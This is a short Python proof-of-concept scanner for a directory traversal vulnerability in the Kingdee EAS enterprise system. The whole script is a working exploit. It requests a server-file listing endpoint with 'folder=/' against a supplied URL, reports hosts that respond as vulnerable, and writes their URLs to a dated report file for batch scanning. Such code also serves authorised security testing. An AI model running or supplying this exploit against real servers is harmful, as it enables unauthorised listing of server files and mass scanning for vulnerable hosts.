import requests
import time
import buter
import wirtefile

filename = "./reps/金蝶EAS系统存在目录遍历"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = "/appmonitor/protected/selector/server_file/files?folder=/&suffix="

def KingdeeEASdirtra(url):
    try:
        reps = requests.get(url + poc, headers=headers, timeout=3, verify=False)
        if reps.status_code == 200 and 'total' in reps.text:
            print(buter.colors.GREEN+  f"存在金蝶EAS系统存在目录遍历 url : {url}" + buter.colors.END)
            reptext = reps.url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现金蝶EAS系统存在目录遍历 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
